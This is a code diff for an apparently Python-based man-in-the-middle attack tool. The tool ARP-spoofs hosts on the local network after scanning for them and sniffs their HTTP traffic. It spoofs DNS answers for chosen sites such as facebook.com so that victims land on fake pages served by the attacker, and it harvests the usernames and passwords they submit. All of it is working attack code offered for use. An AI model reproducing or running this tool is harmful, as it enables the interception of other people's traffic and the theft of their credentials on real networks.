@@ -6,7 +6,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from nfqueue import *
 
-from signal import signal, pause, SIGINT
+from signal import signal, pause, SIGINT, SIGTERM
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from subprocess import Popen, PIPE, STDOUT
 from multiprocessing import Process, Pipe
@@ -16,7 +16,7 @@ from socket import socket, gethostbyname, AF_INET
 from urllib2 import urlopen
 from cgi import FieldStorage
 from re import sub
-from os import geteuid
+from os import kill, getpid, geteuid
 from time import sleep
 from sys import exit
 
@@ -35,37 +35,33 @@ RED = "\033[31m"        # ERROR, CREDS
 
 class ARPSpoof(Thread):
 
-    def __init__(self, iface, iface_mac, gw_ip, gw_mac, vic_ip):
+    def __init__(self, iface, iface_mac, gw_ip, gw_mac, host):
 
         Thread.__init__(self)
         self.iface = iface
         self.iface_mac = iface_mac
         self.gw_ip = gw_ip
         self.gw_mac = gw_mac
-        self.vic_ip = vic_ip
-        self.vic_mac = get_mac(vic_ip)
+        self.host = host
+        self.vic_mac = get_mac(host)
 
     def run(self):
 
-        print(GRAY + "Spoofing %s" % self.vic_ip)
-
-        gw_pkt = ARP(op=2, hwsrc=self.iface_mac, psrc=self.vic_ip,
+        gw_pkt = ARP(op=2, hwsrc=self.iface_mac, psrc=self.host,
                      hwdst=self.gw_mac, pdst=self.gw_ip)
         vic_pkt = ARP(op=2, hwsrc=self.iface_mac, psrc=self.gw_ip,
-                      hwdst=self.vic_mac, pdst=self.vic_ip)
+                      hwdst=self.vic_mac, pdst=self.host)
 
         while True:
             send(vic_pkt, count=2)
             send(gw_pkt, count=2)
-            sniff(filter="arp and host %s" % self.vic_ip , count=1, timeout=4)
+            sniff(filter="arp and host %s" % self.host , count=1, timeout=4)
 
     def heal(self):
 
-        print(GRAY + "Healing %s" % self.vic_ip)
-
         gw_pkt = ARP(op=2, hwsrc=self.gw_mac, psrc=self.gw_ip,
-                     hwdst=self.vic_mac, pdst=self.vic_ip)
-        vic_pkt = ARP(op=2, hwsrc=self.vic_mac, psrc=self.vic_ip,
+                     hwdst=self.vic_mac, pdst=self.host)
+        vic_pkt = ARP(op=2, hwsrc=self.vic_mac, psrc=self.host,
                       hwdst=self.gw_mac, pdst=self.gw_ip)
 
         send(vic_pkt, count=2)
@@ -74,17 +70,18 @@ class ARPSpoof(Thread):
 
 class URLInspect(Thread):
 
-    def __init__(self, iface, vic_ip):
+    def __init__(self, iface, host, conn):
 
         Thread.__init__(self)
         self.iface = iface
-        self.vic_ip = vic_ip
+        self.host = host
+        self.conn = conn
         self.past_url = None
 
     def run(self):
 
         sniff(store=0, filter="port 80 and host %s"
-              % self.vic_ip, prn=self.parse, iface=self.iface)
+              % self.host, prn=self.parse, iface=self.iface)
 
     def stop(self):
 
@@ -130,41 +127,31 @@ class URLInspect(Thread):
             try:
                 if host and post:
                     url = host+post
-
                     if len(url) > 80:
                         url = url[:77] + "..."
-
                     if not url == self.past_url:
-                        print(GRAY + "{:15s} POST   {:15s} {:s}"
-                              .format(self.vic_ip, gethostbyname(url.split("/")[0]), url))
-
+                        self.conn.send(["POST", [self.host, gethostbyname(url.split("/")[0]), url]])
                         self.past_url = url
 
-                elif host and get:
+                if host and get:
                     url = host+get
-
-                    if len(url) > 80:
-                        url = url[:77] + "..."
-
-                    if any(i in url for i in URLSKIP):
-                        pass
-
-                    elif not url == self.past_url:
-                        print(GRAY + "{:15s} GET    {:15s} {:s}"
-                              .format(self.vic_ip, gethostbyname(url.split("/")[0]), url))
-
-                        self.past_url = url
-
+                    if not any(i in url for i in URLSKIP):
+                        if len(url) > 80:
+                            url = url[:77] + "..."
+                        if not url == self.past_url:
+                            self.conn.send(["GET", [self.host, gethostbyname(url.split("/")[0]), url]])
+                            self.past_url = url
             except:
                 pass
 
 
 class HTTPHandler(BaseHTTPRequestHandler):
 
-    def __init__(self, fp, dname, *args):
+    def __init__(self, fp, dname, conn, *args):
 
         self.fp = fp
         self.dname = dname
+        self.conn = conn
         BaseHTTPRequestHandler.__init__(self, *args)
 
     def do_GET(self):
@@ -197,21 +184,20 @@ class HTTPHandler(BaseHTTPRequestHandler):
                 if re.search("[Pp]ass|[Pp]assword|[Pp]asswd", str(att)):
                     passwd =  form[att].value
 
-            print(RED + "Detected credentials for %s, username: %s  & pass: %s"
-                  % (self.dname, user, passwd))
+            self.conn.send(["CRED", [self.dname, user, passwd]])
 
-            # try:
-            #     self.send_response(200)
-            #     self.send_header('Content-type', 'text/html')
-            #     self.end_headers()
-            #     self.wfile.write("<meta http-equiv=\"refresh\" content=\"5; url=https://%s\" />" %
-            #                      self.dname)
-            #     self.wfile.close()
+            try:
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write("<meta http-equiv=\"refresh\" content=\"5; url=https://%s\" />" %
+                                 self.dname)
+                self.wfile.close()
 
-            # except:
-            #     self.send_error(404, "Server Not Found.")
+            except:
+                self.send_error(404, "Server Not Found.")
 
-            self.send_error(404, "Server Not Found.")
+            self.conn.send(["STOP", None])
 
     def log_message(self, format, *args):
 
@@ -220,16 +206,17 @@ class HTTPHandler(BaseHTTPRequestHandler):
 
 class WebServer(Thread):
 
-    def __init__(self, fp, dname, port):
+    def __init__(self, fp, dname, port, conn):
 
         Thread.__init__(self)
         self.fp = fp
         self.dname = dname
         self.port = port
+        self.conn = conn
 
     def handler(self, *args):
 
-        HTTPHandler(self.fp, self.dname, *args)
+        HTTPHandler(self.fp, self.dname, self.conn, *args)
 
     def run(self):
 
@@ -239,11 +226,12 @@ class WebServer(Thread):
 
 class DNSSpoof(Process):
 
-    def __init__(self, iface_ip, vic_ips, dnames):
+    def __init__(self, iface_ip, hosts, dnames, conn):
 
         Process.__init__(self)
         self.iface_ip = iface_ip
-        self.vic_ips = vic_ips
+        self.hosts = hosts
+        self.conn = conn
         self.fp_bank = self.get_fp_bank(dnames)
         self.server_on = False
 
@@ -269,17 +257,15 @@ class DNSSpoof(Process):
 
             dname = dns.qd.qname[:len(dns.qd.qname)-1]
 
-            if ip.src in self.vic_ips:
-                if SHOWDNS:
-                    print(GRAY + "{:15s} DNSQ   {:15s} {:s}"
-                          .format(ip.src, ip.dst, dname))
+            if ip.src in self.hosts:
+                self.conn.send(["DNS", [ip.src, ip.dst, dname]])
 
                 if dname in self.fp_bank.keys():
-                    print(WHITE + "Attacking %s (%s)" % (ip.src, dname))
+                    self.conn.send(["ATT", [ip.src, dname]])
                     pkt.set_verdict(NF_DROP)
 
                     if not self.server_on:
-                        server_thrd = WebServer(self.fp_bank[dname], dname, 80)
+                        server_thrd = WebServer(self.fp_bank[dname], dname, 80, self.conn)
                         server_thrd.start()
                         self.server_on = True
 
@@ -287,8 +273,8 @@ class DNSSpoof(Process):
                              UDP(dport=udp.sport, sport=udp.dport) /
                              DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                                  an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=self.iface_ip)))
-                    send(reply)
-                    send(reply)
+
+                    send(reply, count=2)
 
     def falsify(self, html):
 
@@ -298,7 +284,7 @@ class DNSSpoof(Process):
 
     def get_fp_bank(self, dnames):
 
-        print(WHITE + "Creating fake pages ...")
+        self.conn.send(["STAT", "Creating fake pages"])
 
         fixed = []
         for dname in dnames:
@@ -314,6 +300,30 @@ class DNSSpoof(Process):
             fp_bank[dname] = self.falsify(hfile.read())
 
         return fp_bank
+
+class NScan(Process):
+
+    def __init__(self, iface, hosts, conn):
+
+        Process.__init__(self)
+        self.iface = iface
+        self.hosts = hosts
+        self.conn = conn
+        self.iface_ip = get_ip(iface)
+        self.gw_ip = get_gw(iface)
+
+    def run(self):
+
+        p = Popen("ip route | grep %s | grep 'src %s' | awk '{print $1}'" %
+                  (self.iface, self.iface_ip), shell=True, stdout=PIPE)
+        netid = p.communicate()[0].rstrip()
+
+        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
+                         ARP(pdst=netid), timeout=4, iface=self.iface, inter=0.1)
+
+        for snd, rcv in ans:
+            if rcv.psrc not in [self.gw_ip, self.iface_ip] + self.hosts:
+                self.conn.send(["HOST", rcv.psrc])
 
 
 def set_forward(enable):
@@ -337,27 +347,6 @@ def set_nfq(enable):
         Popen("iptables -t nat -F", shell=True, stdout=PIPE)
         Popen("iptables -X", shell=True, stdout=PIPE)
         Popen("iptables -t nat -X", shell=True, stdout=PIPE)
-
-
-def nscan(iface, hosts):
-
-    iface_ip = get_ip(iface)
-    gw_ip = get_gw(iface)
-
-    p = Popen("ip route | grep %s | grep 'src %s' | awk '{print $1}'" %
-              (iface, iface_ip), shell=True, stdout=PIPE)
-    netid = p.communicate()[0].rstrip()
-
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
-                     ARP(pdst=netid), timeout=4, iface=iface, inter=0.1)
-
-    for snd, rcv in ans:
-        if rcv.psrc not in [gw_ip, iface_ip] + hosts:
-            hosts.append(rcv.psrc)
-
-            print(GRAY + "Up host detected %s" % rcv.psrc)
-
-    return hosts
 
 
 def get_ip(iface):
@@ -470,7 +459,7 @@ def main():
 
         child_conn.send(["STOP", None])
 
-
+    print(WHITE + "Initializing")
     signal(SIGINT, sig_handler)
 
     parser = ArgumentParser()
@@ -517,71 +506,104 @@ def main():
         DOMAINS = ["facebook.com"]
         print(ORANGE + "WARNING: No domains specified, using default [facebook.com]")
 
-    vic_ips = []
-    if args.ip:
-        if valid_ip(args.ip):
-            vic_ips.append(args.ip)
-        else:
-            exit(RED + "ERROR: IP address is invalid")
-
-    else:
-        while len(vic_ips) == 0:
-            print(WHITE + "Scanning network ...")
-            vic_ips = nscan(iface, vic_ips)
-
-            if len(vic_ips) > 0:
-                break
-
-            print(ORANGE + "WARNING: No hosts detected")
-
-    print(WHITE + "Starting up ...")
     iface_ip = get_ip(iface)
     iface_mac = get_if_mac(iface)
     gw_ip = get_gw(iface)
     gw_mac = get_mac(gw_ip)
 
-    arpspoof_thrds = []
-    urlinspect_thrds = []
     set_forward(True)
-
-    dnsspoof_proc = DNSSpoof(iface_ip, vic_ips, DOMAINS)
-    dnsspoof_proc.start()
     set_nfq(True)
 
-    for vic_ip in vic_ips:
-        arpspoof_thrds.append(ARPSpoof(iface, iface_mac, gw_ip, gw_mac, vic_ip))
-        arpspoof_thrds[-1].setDaemon(True)
-        arpspoof_thrds[-1].start()
+    arpspoof_thrds = []
+    urlinspect_thrds = []
+    hosts = []
 
-        if SHOWHTTP:
-            urlinspect_thrds.append(URLInspect(iface, vic_ip))
-            urlinspect_thrds[-1].setDaemon(True)
+    if args.ip:
+        if valid_ip(args.ip):
+            print(GRAY + "Spoofing %s" % args.ip)
+            hosts.append(args.ip)
+
+            arpspoof_thrds.append(ARPSpoof(iface, iface_mac, gw_ip, gw_mac, args.ip))
+            arpspoof_thrds[-1].start()
+
+            urlinspect_thrds.append(URLInspect(iface, args.ip, child_conn))
             urlinspect_thrds[-1].start()
+        else:
+            exit(RED + "ERROR: IP address is invalid")
+
+    else:
+        print(WHITE + "Scanning network")
+        nscan_proc = NScan(iface, hosts, child_conn)
+        nscan_proc.start()
+
+        while True:
+            if parent_conn.poll():
+                recieved = parent_conn.recv()
+
+                if recieved[0] == "HOST":
+                    print(GRAY + "Spoofing %s" % recieved[1])
+                    hosts.append(recieved[1])
+
+                    arpspoof_thrds.append(ARPSpoof(iface, iface_mac, gw_ip, gw_mac, recieved[1]))
+                    arpspoof_thrds[-1].start()
+
+                    urlinspect_thrds.append(URLInspect(iface, recieved[1], child_conn))
+                    urlinspect_thrds[-1].start()
+
+                    print(GRAY + "Host detected %s" % recieved[1])
+
+            if not nscan_proc.is_alive():
+                break
+
+            sleep(0.2)
+
+        if hosts == []:
+            print(ORANGE + "No hosts detected")
+            exit(0)
+
+    dnsspoof_proc = DNSSpoof(iface_ip, hosts, DOMAINS, child_conn)
+    dnsspoof_proc.start()
 
     while True:
+
         if parent_conn.poll():
             recieved = parent_conn.recv()
 
             if recieved[0] == "STOP":
-                print(WHITE + "Exitting...")
+                print(WHITE + "Stopping")
                 set_forward(False)
                 set_nfq(False)
 
                 for thrd in arpspoof_thrds:
+                    print(GRAY + "Healing %s" % thrd.host)
                     thrd.heal()
 
+                sleep(5)
                 break
 
-            if recieved[0] == "NEW_VIC":
-                vic_ips.append(recieved[1])
+            if recieved[0] == "STAT":
+                print(WHITE + recieved[1])
 
-                arpspoof_thrds.append(ARPSpoof(iface, recieved[1]))
-                arpspoof_thrds[-1].start()
+            if recieved[0] == "ATT":
+                print(WHITE + "Attacking {:s} ({:s})".format(*recieved[1]))
 
-                urlinspect_thrds.append(URLInspect(iface, recieved[1]))
-                urlinspect_thrds[-1].start()
+            if recieved[0] == "DNS" and SHOWDNS:
+                print(GRAY + "{:15s} DNSQ  {:15s} {:s}".format(*recieved[1]))
+
+            if recieved[0] == "GET" and SHOWHTTP:
+                print(GRAY + "{:15s} GET   {:15s} {:s}".format(*recieved[1]))
+
+            if recieved[0] == "POST" and SHOWHTTP:
+                print(GRAY + "{:15s} POST  {:15s} {:s}".format(*recieved[1]))
+
+            if recieved[0] == "CRED":
+                print(RED + "Attack success, website:{:s} user:{:s} pass:{:s}".format(*recieved[1]))
 
         sleep(0.2)
+
+    os.kill(dnsspoof_proc.pid, SIGTERM)
+    os.kill(getpid(), SIGTERM)
+    print(WHITE + "Stopped")
 
 if __name__ == '__main__':
     main()
